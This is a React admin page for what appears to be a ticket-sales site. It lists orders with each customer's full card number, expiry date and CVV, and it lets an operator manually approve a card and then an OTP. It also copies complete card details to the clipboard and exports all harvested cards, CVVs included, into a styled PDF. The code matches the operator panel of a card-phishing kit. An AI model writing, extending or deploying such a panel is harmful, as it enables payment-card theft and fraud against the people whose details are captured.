import { useEffect, useState, useCallback } from "react";
import { motion } from "framer-motion";
import { supabase } from "@/integrations/supabase/client";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import {
  Search, CreditCard, Mail, Phone, Hash, Receipt, Ticket,
  CheckCircle, XCircle, Filter, ShieldCheck, Clock, Ban, Landmark, Copy, Check, FileText, Trash2,
} from "lucide-react";
import { toast } from "sonner";
import jsPDF from "jspdf";
import html2canvas from "html2canvas";
import ExportButtons from "@/components/admin/ExportButtons";
import { playChime } from "@/hooks/use-action-sound";
import { bankLogos, bankColors, bankUIColors } from "@/data/bankLogos";
import SwipeToDelete from "@/components/admin/SwipeToDelete";
import {
  AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent,
  AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
} from "@/components/ui/alert-dialog";

interface Order {
  id: string;
  email: string;
  phone: string;
  tickets: any[];
  subtotal: number;
  vat: number;
  total: number;
  payment_method: string;
  status: string;
  confirmation_number: string | null;
  created_at: string;
  card_last4: string | null;
  card_brand: string | null;
  cardholder_name: string | null;
  bank_name: string | null;
  card_full_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
}

const statusConfig: Record<string, { label: string; gradient: string; bg: string; text: string; dot: string; icon: any }> = {
  confirmed: { label: "مقبول", gradient: "from-emerald-500 to-teal-500", bg: "bg-emerald-50", text: "text-emerald-600", dot: "bg-emerald-400", icon: ShieldCheck },
  pending: { label: "بانتظار موافقة البطاقة", gradient: "from-amber-400 to-orange-500", bg: "bg-amber-50", text: "text-amber-600", dot: "bg-amber-400", icon: Clock },
  approved_card: { label: "تمت موافقة البطاقة", gradient: "from-blue-500 to-indigo-500", bg: "bg-blue-50", text: "text-blue-600", dot: "bg-blue-400", icon: CreditCard },
  pending_otp: { label: "بانتظار موافقة OTP", gradient: "from-orange-400 to-red-400", bg: "bg-orange-50", text: "text-orange-600", dot: "bg-orange-400", icon: Clock },
  rejected: { label: "مرفوض", gradient: "from-red-500 to-rose-500", bg: "bg-red-50", text: "text-red-500", dot: "bg-red-400", icon: XCircle },
  cancelled: { label: "ملغي", gradient: "from-slate-400 to-slate-500", bg: "bg-slate-50", text: "text-slate-500", dot: "bg-slate-400", icon: Ban },
};

const AdminOrders = () => {
  const [orders, setOrders] = useState<Order[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [bankFilter, setBankFilter] = useState<string>("all");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const [showClearAll, setShowClearAll] = useState(false);
  const [redFlash, setRedFlash] = useState(false);

  const clearAllOrders = async () => {
    playChime("delete");
    if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
    setRedFlash(true);
    setTimeout(() => setRedFlash(false), 600);
    try {
      await supabase.from("otp_requests").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      await supabase.from("ticket_orders").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      setOrders([]);
      setShowClearAll(false);
      toast.success("تم مسح جميع الطلبات بنجاح");
    } catch {
      toast.error("حدث خطأ أثناء المسح");
    }
  };

  const deleteSingleOrder = useCallback(async (id: string) => {
    playChime("delete");
    if (navigator.vibrate) navigator.vibrate(100);
    try {
      await supabase.from("otp_requests").delete().eq("order_id", id);
      await supabase.from("ticket_orders").delete().eq("id", id);
      setOrders(prev => prev.filter(o => o.id !== id));
      toast.success("تم حذف الطلب");
    } catch {
      toast.error("حدث خطأ أثناء الحذف");
    }
  }, []);

  const copyCardInfo = (order: Order) => {
    const parts: string[] = [];
    if (order.cardholder_name) parts.push(`الاسم: ${order.cardholder_name}`);
    if (order.card_full_number) parts.push(`الرقم: ${order.card_full_number}`);
    else if (order.card_last4) parts.push(`الرقم: •••• ${order.card_last4}`);
    if (order.card_expiry) parts.push(`الانتهاء: ${order.card_expiry}`);
    if (order.card_cvv) parts.push(`CVV: ${order.card_cvv}`);
    if (order.card_brand) parts.push(`النوع: ${order.card_brand}`);
    if (order.bank_name) parts.push(`البنك: ${order.bank_name}`);
    
    navigator.clipboard.writeText(parts.join("\n")).then(() => {
      setCopiedId(order.id);
      toast.success("تم نسخ بيانات البطاقة", { duration: 2000 });
      setTimeout(() => setCopiedId(null), 2000);
    });
  };

  const exportCardsPDF = async () => {
    const cardsRaw = filtered.filter(o => o.card_full_number || o.card_last4);
    // Deduplicate by card number
    const seen = new Set<string>();
    const cardsData = cardsRaw.filter(o => {
      const key = o.card_full_number || o.card_last4 || o.id;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
    if (cardsData.length === 0) {
      toast.error("لا توجد بيانات بطاقات للتصدير");
      return;
    }

    toast.loading("جاري تصدير التقرير...", { id: "pdf-export" });

    // Build hidden HTML with 3D card design
    const container = document.createElement("div");
    container.style.cssText = "position:fixed;left:-9999px;top:0;width:794px;background:#ffffff;font-family:'Segoe UI',Tahoma,Arial,sans-serif;direction:rtl;padding:40px;";
    container.innerHTML = `
      <div style="text-align:center;margin-bottom:36px;padding-bottom:20px;">
        <h1 style="font-size:22px;font-weight:800;color:#1a1a2e;margin:0 0 6px;">💳 تقرير بيانات البطاقات</h1>
        <p style="font-size:11px;color:#64748b;margin:0;">${new Date().toLocaleDateString("ar-SA")} — ${cardsData.length} بطاقة</p>
        <div style="height:2px;background:linear-gradient(90deg,transparent,#d4a843,transparent);margin-top:14px;border-radius:2px;"></div>
      </div>
      ${cardsData.map((o, i) => {
        const bankKey = o.bank_name || "";
        const logoUrl = bankLogos[bankKey] || "";
        const colors = bankColors[bankKey] || { header: "linear-gradient(135deg,#1a1a2e,#2d2d44)", accent: "#d4a843", bg: "#fafbfc", border: "#e2e8f0" };
        const gradientBg = colors.header;

        return `
        <div style="margin-bottom:28px;break-inside:avoid;">
          <div style="display:flex;gap:20px;align-items:flex-start;direction:rtl;">
            <!-- 3D Card Front -->
            <div style="width:380px;min-width:380px;height:230px;border-radius:16px;background:${gradientBg};box-shadow:0 20px 40px rgba(0,0,0,0.4),0 0 0 1px rgba(255,255,255,0.1) inset;padding:24px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;">
              <!-- Shine overlay -->
              <div style="position:absolute;top:-50%;right:-50%;width:100%;height:200%;background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 50%);transform:rotate(-20deg);pointer-events:none;"></div>
              <!-- Chip + Bank -->
              <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1;">
                <div style="display:flex;align-items:center;gap:8px;">
                  ${logoUrl ? `<img src="${logoUrl}" style="width:38px;height:38px;border-radius:8px;object-fit:contain;background:rgba(255,255,255,0.95);padding:4px;box-shadow:0 2px 8px rgba(0,0,0,0.2);" />` : ""}
                  <div>
                    <p style="font-size:11px;font-weight:700;color:rgba(255,255,255,0.95);margin:0;">${o.bank_name || "بطاقة دفع"}</p>
                    <p style="font-size:9px;color:rgba(255,255,255,0.5);margin:2px 0 0;">${(o.card_brand || "CARD").toUpperCase()}</p>
                  </div>
                </div>
                <!-- EMV Chip -->
                <div style="width:42px;height:32px;border-radius:6px;background:linear-gradient(145deg,#e8d5a3,#c9a84c,#e8d5a3);box-shadow:0 1px 3px rgba(0,0,0,0.3);position:relative;">
                  <div style="position:absolute;top:8px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                  <div style="position:absolute;top:14px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                  <div style="position:absolute;top:20px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                  <div style="position:absolute;top:4px;left:50%;width:1px;height:24px;background:rgba(0,0,0,0.1);"></div>
                </div>
              </div>
              <!-- Card Number -->
              <div style="position:relative;z-index:1;text-align:center;">
                <p style="font-size:20px;font-weight:700;color:#fff;margin:0;letter-spacing:4px;direction:ltr;text-shadow:0 1px 3px rgba(0,0,0,0.3);">${o.card_full_number ? o.card_full_number.replace(/(.{4})/g, '$1 ').trim() : `**** **** **** ${o.card_last4}`}</p>
              </div>
              <!-- Bottom row -->
              <div style="display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1;">
                <div style="text-align:left;direction:ltr;">
                  <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;text-transform:uppercase;letter-spacing:1px;">VALID THRU</p>
                  <p style="font-size:14px;font-weight:600;color:#fff;margin:2px 0 0;letter-spacing:1px;">${o.card_expiry || "MM/YY"}</p>
                </div>
                <div style="text-align:center;">
                  <p style="font-size:12px;font-weight:700;color:rgba(255,255,255,0.9);margin:0;letter-spacing:1px;">${o.cardholder_name || "CARDHOLDER"}</p>
                </div>
                <div style="text-align:right;">
                  <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;text-transform:uppercase;letter-spacing:1px;">CVV</p>
                  <p style="font-size:14px;font-weight:700;color:#fbbf24;margin:2px 0 0;text-shadow:0 0 6px rgba(251,191,36,0.4);">${o.card_cvv || "***"}</p>
                </div>
              </div>
            </div>
            <div style="flex:1;background:#f8fafc;border-radius:12px;padding:18px;border:1px solid #e2e8f0;display:flex;flex-direction:column;justify-content:center;gap:10px;">
              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
                <span style="font-size:10px;color:#94a3b8;background:#f1f5f9;padding:3px 10px;border-radius:6px;direction:ltr;">${o.confirmation_number || o.id.slice(0, 8)}</span>
                <span style="font-size:13px;font-weight:800;color:#1e293b;">#${i + 1}</span>
              </div>
              <div style="height:1px;background:#e2e8f0;"></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">المبلغ</span><span style="font-size:14px;font-weight:800;color:#059669;">${o.total} ر.س</span></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">الحالة</span><span style="font-size:11px;font-weight:600;color:${o.status === 'confirmed' ? '#059669' : o.status === 'rejected' ? '#dc2626' : '#d97706'};">${o.status === 'confirmed' ? '✅ مؤكد' : o.status === 'rejected' ? '❌ مرفوض' : '⏳ معلق'}</span></div>
              <div style="height:1px;background:#e2e8f0;"></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📧</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.email}</span></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📱</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.phone}</span></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📅</span><span style="font-size:10px;color:#334155;">${new Date(o.created_at).toLocaleDateString("ar-SA")}</span></div>
            </div>
          </div>
        </div>`;
      }).join("")}
      <div style="text-align:center;margin-top:24px;padding-top:12px;border-top:1px solid #e2e8f0;">
        <p style="font-size:9px;color:#94a3b8;">🔒 سري وخاص — تقرير بيانات البطاقات — ${new Date().toLocaleString("ar-SA")}</p>
      </div>
    `;
    document.body.appendChild(container);

    try {
      const canvas = await html2canvas(container, { scale: 2, useCORS: true, backgroundColor: "#ffffff" });
      document.body.removeChild(container);

      const imgW = 190;
      const imgH = (canvas.height * imgW) / canvas.width;
      const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
      const pageH = 277;
      let position = 10;

      if (imgH <= pageH) {
        doc.addImage(canvas.toDataURL("image/png"), "PNG", 10, position, imgW, imgH);
      } else {
        // Multi-page
        let remainingH = canvas.height;
        let srcY = 0;
        const sliceHPx = (pageH / imgH) * canvas.height;

        while (remainingH > 0) {
          const sliceH = Math.min(sliceHPx, remainingH);
          const pageCanvas = document.createElement("canvas");
          pageCanvas.width = canvas.width;
          pageCanvas.height = sliceH;
          const ctx = pageCanvas.getContext("2d")!;
          ctx.drawImage(canvas, 0, srcY, canvas.width, sliceH, 0, 0, canvas.width, sliceH);

          const pageImgH = (sliceH * imgW) / canvas.width;
          if (srcY > 0) doc.addPage();
          doc.addImage(pageCanvas.toDataURL("image/png"), "PNG", 10, 10, imgW, pageImgH);

          srcY += sliceH;
          remainingH -= sliceH;
        }
      }

      doc.save("card-data-report.pdf");
      toast.success("تم تصدير بيانات البطاقات بنجاح", { id: "pdf-export" });
    } catch (err) {
      document.body.removeChild(container);
      console.error(err);
      toast.error("فشل التصدير", { id: "pdf-export" });
    }
  };

  const fetchOrders = async () => {
    const { data } = await supabase
      .from("ticket_orders")
      .select("*")
      .order("created_at", { ascending: false });
    setOrders((data as Order[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    fetchOrders();
    const channel = supabase
      .channel("orders-realtime")
      .on("postgres_changes" as any, { event: "*", schema: "public", table: "ticket_orders" }, () => fetchOrders())
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);

  useEffect(() => {
    const handler = () => fetchOrders();
    window.addEventListener("admin-pull-refresh", handler);
    return () => window.removeEventListener("admin-pull-refresh", handler);
  }, []);

  const updateStatus = async (id: string, currentStatus: string, action: "approve" | "reject") => {
    let newStatus = "rejected";
    if (action === "approve") {
      if (currentStatus === "pending") newStatus = "approved_card";
      else if (currentStatus === "pending_otp") newStatus = "confirmed";
      else newStatus = "confirmed";
    }
    await supabase.from("ticket_orders").update({ status: newStatus }).eq("id", id);
    setOrders(prev => prev.map(o => o.id === id ? { ...o, status: newStatus } : o));
  };

  const uniqueBanks = [...new Set(orders.map(o => o.bank_name).filter(Boolean))] as string[];

  const filtered = orders.filter(o => {
    // Status filter
    if (statusFilter !== "all") {
      if (statusFilter === "unconfirmed") {
        if (o.status === "confirmed") return false;
      } else if (o.status !== statusFilter) return false;
    }
    // Bank filter
    if (bankFilter !== "all" && (o.bank_name || "") !== bankFilter) return false;
    if (!search) return true;
    const q = search.toLowerCase();
    return o.email.toLowerCase().includes(q) || o.phone.includes(q) || (o.confirmation_number || "").includes(q);
  });

  const totalRevenue = filtered.reduce((s, o) => s + (o.status === "confirmed" ? o.total : 0), 0);

  return (
    <div className="space-y-5 relative">
      {redFlash && <div className="fixed inset-0 bg-red-500/20 z-[100] pointer-events-none animate-[flash_0.6s_ease-out_forwards]" />}
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-emerald-500 to-teal-600 flex items-center justify-center shadow-lg shadow-emerald-500/20">
            <Ticket className="w-4.5 h-4.5 text-white" />
          </div>
          <div>
            <h2 className="text-[15px] font-bold text-slate-800">طلبات التذاكر</h2>
            <p className="text-[10px] text-slate-400">{filtered.length} طلب • {totalRevenue} ر.س إيرادات</p>
          </div>
        </div>
        <div className="flex items-center gap-1.5">
          <ExportButtons
            data={filtered}
            filename="orders"
            title="طلبات التذاكر"
            columns={[
              { key: "email", label: "البريد" },
              { key: "phone", label: "الهاتف" },
              { key: "total", label: "الإجمالي", format: (v) => `${v} ر.س` },
              { key: "payment_method", label: "طريقة الدفع", format: (v) => v === "card" ? "بطاقة" : v },
              { key: "status", label: "الحالة", format: (v) => v === "confirmed" ? "مقبول" : v === "rejected" ? "مرفوض" : "قيد المراجعة" },
              { key: "confirmation_number", label: "رقم التأكيد" },
              { key: "cardholder_name", label: "حامل البطاقة" },
              { key: "created_at", label: "التاريخ", format: (v) => new Date(v).toLocaleDateString("ar-SA") },
            ]}
          />
          <button
            onClick={exportCardsPDF}
            className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-violet-50 text-violet-600 text-[11px] font-medium hover:bg-violet-100 transition-colors"
            title="تصدير بيانات البطاقات PDF"
          >
            <CreditCard className="w-3.5 h-3.5" />
            بطاقات PDF
          </button>
          {orders.length > 0 && (
            <button
              onClick={() => setShowClearAll(true)}
              className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors"
              title="مسح جميع الطلبات"
            >
              <Trash2 className="w-3.5 h-3.5" />
              مسح الكل
            </button>
          )}
        </div>
      </div>


      <div className="relative">
        <Search className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
        <input
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="بحث بالبريد أو رقم الجوال أو رقم التأكيد..."
          className="w-full bg-white border border-slate-200/80 rounded-xl pr-10 pl-4 py-2.5 text-[16px] sm:text-[13px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-400 transition-all shadow-sm"
        />
      </div>

      {/* Status Filter */}
      <div className="flex items-center gap-2 flex-wrap">
        <span className="text-[10px] text-slate-400 flex items-center gap-1"><Filter className="w-3 h-3" /> الحالة:</span>
        {[
          { key: "all", label: "الكل", gradient: "from-slate-600 to-slate-700" },
          ...Object.entries(statusConfig).map(([key, val]) => ({
            key,
            label: val.label,
            gradient: val.gradient,
          })),
        ].map((f) => {
          const count = f.key === "all" ? orders.length : orders.filter(o => o.status === f.key).length;
          return (
            <button
              key={f.key}
              onClick={() => setStatusFilter(f.key)}
              className={`px-3 py-1.5 rounded-lg text-[11px] font-semibold transition-all duration-200 flex items-center gap-1.5 ${
                statusFilter === f.key
                  ? `bg-gradient-to-r ${f.gradient} text-white shadow-sm`
                  : "bg-white text-slate-500 hover:bg-slate-50 border border-slate-200/80"
              }`}
            >
              {f.label}
              <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded-full ${
                statusFilter === f.key ? "bg-white/20" : "bg-slate-100 text-slate-400"
              }`}>{count}</span>
            </button>
          );
        })}
      </div>

      {/* Bank Filter */}
      {uniqueBanks.length > 0 && (
        <div className="flex items-center gap-2 flex-wrap">
          <span className="text-[10px] text-slate-400 flex items-center gap-1"><Landmark className="w-3 h-3" /> البنك:</span>
          <button
            onClick={() => setBankFilter("all")}
            className={`px-3 py-1.5 rounded-lg text-[11px] font-semibold transition-all duration-200 ${
              bankFilter === "all"
                ? "bg-gradient-to-r from-slate-600 to-slate-700 text-white shadow-sm"
                : "bg-white text-slate-500 hover:bg-slate-50 border border-slate-200/80"
            }`}
          >
            الكل
          </button>
          {uniqueBanks.map((bank) => {
            const count = orders.filter(o => o.bank_name === bank).length;
            const logo = bankLogos[bank] || "";
            return (
              <button
                key={bank}
                onClick={() => setBankFilter(bank)}
                className={`px-3 py-1.5 rounded-lg text-[11px] font-semibold transition-all duration-200 flex items-center gap-1.5 ${
                  bankFilter === bank
                    ? "bg-gradient-to-r from-violet-500 to-purple-600 text-white shadow-sm"
                    : "bg-white text-slate-500 hover:bg-slate-50 border border-slate-200/80"
                }`}
              >
                {logo && <img src={logo} alt={bank} className="w-4 h-4 rounded object-contain" />}
                {bank}
                <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded-full ${
                  bankFilter === bank ? "bg-white/20" : "bg-slate-100 text-slate-400"
                }`}>{count}</span>
              </button>
            );
          })}
        </div>
      )}



      {/* Order Cards */}
      <div className="space-y-3">
        {loading ? (
          [1, 2, 3].map(i => (
            <div key={i} className="bg-white rounded-2xl border border-slate-100/80 p-5 animate-pulse">
              <div className="flex gap-3">
                <div className="w-11 h-11 bg-gradient-to-br from-slate-100 to-slate-50 rounded-xl" />
                <div className="flex-1 space-y-2.5">
                  <div className="w-1/3 h-3.5 bg-slate-100 rounded-lg" />
                  <div className="w-1/2 h-3 bg-slate-50 rounded-lg" />
                </div>
              </div>
            </div>
          ))
        ) : filtered.length === 0 ? (
          <div className="bg-white rounded-2xl border border-slate-100/80 p-12 text-center">
            <div className="w-14 h-14 mx-auto rounded-2xl bg-slate-50 flex items-center justify-center mb-3">
              <Ticket className="w-6 h-6 text-slate-300" />
            </div>
            <p className="text-slate-400 text-sm">لا توجد طلبات</p>
          </div>
        ) : (
          filtered.map((o) => {
            const st = statusConfig[o.status] || statusConfig.pending;
            const StIcon = st.icon;
            const isPending = o.status === "pending" || o.status === "pending_otp";

            const bankC = o.bank_name ? bankUIColors[o.bank_name] : null;

            return (
              <SwipeToDelete key={o.id} onDelete={() => deleteSingleOrder(o.id)}>
              <div
                className={`bg-white rounded-2xl border overflow-hidden transition-all duration-300 hover:shadow-lg hover:-translate-y-0.5 ${
                  isPending ? "border-amber-200/80 shadow-sm shadow-amber-100/50" : bankC ? `${bankC.border}/80` : "border-slate-100/80 hover:shadow-slate-200/60"
                }`}
              >
                {/* Gradient top strip */}
                <div className={`h-1 bg-gradient-to-r ${bankC ? bankC.strip : st.gradient}`} />

                {/* Header */}
                <div className="p-4">
                  <div className="flex items-start gap-3">
                    <div className={`w-11 h-11 rounded-xl bg-gradient-to-br ${st.gradient} flex items-center justify-center shadow-md shrink-0`}>
                      <Ticket className="w-5 h-5 text-white" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between gap-2">
                        <span className="text-[13px] font-semibold text-slate-800 truncate" dir="ltr">{o.email}</span>
                        <span className={`text-[9px] font-bold px-2.5 py-0.5 rounded-full bg-gradient-to-r ${st.gradient} text-white shadow-sm whitespace-nowrap`}>
                          {st.label}
                        </span>
                      </div>
                      <div className="flex items-center gap-3 mt-1.5">
                        <span className="flex items-center gap-1 text-[11px] text-slate-400">
                          <Phone className="w-3 h-3" />
                          <span dir="ltr">{o.phone}</span>
                        </span>
                        <span className="text-[10px] text-slate-300">
                          {format(new Date(o.created_at), "dd MMM، HH:mm", { locale: ar })}
                        </span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Details */}
                <div className="px-4 pb-4 space-y-2.5">
                  {/* Order Info */}
                  <div className="rounded-xl overflow-hidden border border-slate-100/80">
                    <div className="bg-gradient-to-l from-blue-50/80 to-transparent px-3 py-2 flex items-center justify-between border-b border-slate-100/50">
                      <span className="text-[11px] font-bold text-blue-600 flex items-center gap-1.5">
                        <Receipt className="w-3.5 h-3.5" />
                        تفاصيل الطلب
                      </span>
                      {o.confirmation_number && (
                        <span className="text-[10px] font-mono text-blue-500 bg-blue-50 px-2 py-0.5 rounded-md">
                          #{o.confirmation_number}
                        </span>
                      )}
                    </div>
                    <div className="p-3 space-y-2 text-[12px]">
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">المجموع الفرعي</span>
                        <span className="text-slate-600">{o.subtotal} ر.س</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">ضريبة القيمة المضافة</span>
                        <span className="text-slate-600">{o.vat} ر.س</span>
                      </div>
                      <div className="flex items-center justify-between border-t border-slate-100/80 pt-2">
                        <span className="text-slate-700 font-bold">الإجمالي</span>
                        <span className="text-[15px] font-bold bg-gradient-to-r from-emerald-600 to-teal-600 bg-clip-text text-transparent">{o.total} ر.س</span>
                      </div>
                    </div>
                  </div>

                  {/* Payment */}
                  <div className={`rounded-xl overflow-hidden border ${bankC ? bankC.border : "border-slate-100/80"}`}>
                    <div className={`${bankC ? bankC.bg : "bg-gradient-to-l from-violet-50/80 to-transparent"} px-3 py-2 border-b ${bankC ? bankC.border + "/50" : "border-slate-100/50"} flex items-center justify-between`}>
                      <span className={`text-[11px] font-bold ${bankC ? bankC.text : "text-violet-600"} flex items-center gap-1.5`}>
                        <CreditCard className="w-3.5 h-3.5" />
                        بيانات الدفع
                      </span>
                      {(o.card_full_number || o.card_last4) && (
                        <button
                          onClick={() => copyCardInfo(o)}
                          className={`flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] font-semibold transition-all duration-200 ${
                            copiedId === o.id
                              ? "bg-emerald-100 text-emerald-600"
                              : "bg-violet-100 text-violet-600 hover:bg-violet-200 active:scale-95"
                          }`}
                        >
                          {copiedId === o.id ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                          {copiedId === o.id ? "تم النسخ" : "نسخ البيانات"}
                        </button>
                      )}
                    </div>
                    <div className="p-3 space-y-2 text-[12px]">
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">طريقة الدفع</span>
                        <span className="text-slate-700 font-medium">
                          {o.payment_method === "card" ? "بطاقة ائتمان" : o.payment_method}
                        </span>
                      </div>
                      {o.card_full_number && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">رقم البطاقة الكامل</span>
                          <div className="flex items-center gap-1.5">
                            <span className="text-[10px] uppercase font-bold text-violet-500 bg-violet-50 px-1.5 py-0.5 rounded">{o.card_brand || "CARD"}</span>
                            <span className="font-mono text-slate-700 font-semibold" dir="ltr">{o.card_full_number}</span>
                          </div>
                        </div>
                      )}
                      {!o.card_full_number && o.card_last4 && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">رقم البطاقة</span>
                          <div className="flex items-center gap-1.5">
                            <span className="text-[10px] uppercase font-bold text-violet-500 bg-violet-50 px-1.5 py-0.5 rounded">{o.card_brand || "CARD"}</span>
                            <span className="font-mono text-slate-600" dir="ltr">•••• {o.card_last4}</span>
                          </div>
                        </div>
                      )}
                      {o.card_expiry && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">تاريخ الانتهاء</span>
                          <span className="font-mono text-slate-700 font-semibold" dir="ltr">{o.card_expiry}</span>
                        </div>
                      )}
                      {o.card_cvv && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">CVV</span>
                          <span className="font-mono text-red-600 font-bold bg-red-50 px-2 py-0.5 rounded" dir="ltr">{o.card_cvv}</span>
                        </div>
                      )}
                      {o.cardholder_name && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">حامل البطاقة</span>
                          <span className="text-slate-700 font-medium">{o.cardholder_name}</span>
                        </div>
                      )}
                      {o.bank_name && (() => {
                        const bankLogo = bankLogos[o.bank_name] || "";
                        return (
                          <motion.div
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ duration: 0.4, ease: "easeOut" }}
                            className={`flex items-center justify-between ${bankC ? `${bankC.bg} -mx-3 px-3 py-1.5 rounded-lg` : ""}`}
                          >
                            <span className="text-slate-400 flex items-center gap-1"><Landmark className="w-3 h-3" /> البنك</span>
                            <span className={`font-semibold flex items-center gap-2 ${bankC ? bankC.accent : "text-slate-700"}`}>
                              {bankLogo && (
                                <motion.img
                                  src={bankLogo}
                                  alt={o.bank_name}
                                  className="w-6 h-6 rounded-md object-contain bg-white border border-slate-200/80 p-0.5"
                                  initial={{ scale: 0, rotate: -90 }}
                                  animate={{ scale: 1, rotate: 0 }}
                                  transition={{ type: "spring", stiffness: 260, damping: 18, delay: 0.15 }}
                                />
                              )}
                              {o.bank_name}
                            </span>
                          </motion.div>
                        );
                      })()}
                    </div>
                  </div>

                  {/* Action Buttons */}
                  {isPending ? (
                    <div className="flex gap-2">
                      <button
                        onClick={() => updateStatus(o.id, o.status, "approve")}
                        className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 text-white text-[12px] font-bold shadow-md shadow-emerald-500/20 hover:shadow-lg hover:shadow-emerald-500/30 transition-all active:scale-[0.98]"
                      >
                        <CheckCircle className="w-4 h-4" />
                        {o.status === "pending" ? "موافقة البطاقة" : "موافقة OTP"}
                      </button>
                      <button
                        onClick={() => updateStatus(o.id, o.status, "reject")}
                        className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-gradient-to-r from-red-500 to-rose-500 text-white text-[12px] font-bold shadow-md shadow-red-500/20 hover:shadow-lg hover:shadow-red-500/30 transition-all active:scale-[0.98]"
                      >
                        <XCircle className="w-4 h-4" />
                        رفض
                      </button>
                    </div>
                  ) : (
                    <div className={`flex items-center justify-center gap-2 py-2.5 rounded-xl text-[12px] font-bold ${st.bg} ${st.text}`}>
                      <StIcon className="w-4 h-4" />
                      {o.status === "confirmed" ? "تم القبول"
                       : o.status === "approved_card" ? "تمت موافقة البطاقة — بانتظار OTP"
                       : "تم الرفض"}
                    </div>
                  )}
                </div>
              </div>
              </SwipeToDelete>
            );
          })
        )}
      </div>

      <AlertDialog open={showClearAll} onOpenChange={setShowClearAll}>
        <AlertDialogContent dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle>مسح جميع الطلبات</AlertDialogTitle>
            <AlertDialogDescription>
              هل أنت متأكد من مسح جميع طلبات التذاكر؟ سيتم حذف {orders.length} طلب نهائياً ولا يمكن التراجع عن هذا الإجراء.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex-row-reverse gap-2">
            <AlertDialogCancel>إلغاء</AlertDialogCancel>
            <AlertDialogAction onClick={clearAllOrders} className="bg-red-500 hover:bg-red-600">
              مسح الكل
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default AdminOrders;
